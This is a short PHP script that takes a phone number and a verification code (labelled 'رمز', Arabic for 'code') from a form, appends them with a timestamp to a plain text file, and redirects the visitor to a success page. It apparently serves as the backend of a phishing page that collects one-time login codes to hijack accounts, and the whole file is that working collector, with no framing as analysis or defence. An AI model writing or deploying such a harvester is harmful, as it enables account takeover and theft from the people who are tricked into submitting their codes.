<?php
$phone = htmlspecialchars($_POST['phone']);
$code = htmlspecialchars($_POST['code']);
$timestamp = date("Y-m-d H:i:s");

$data = "[$timestamp] 📞 $phone | 🔐 رمز: $code\n";

file_put_contents("data.txt", $data, FILE_APPEND | LOCK_EX);

header("Location: success.html");
exit();
?>
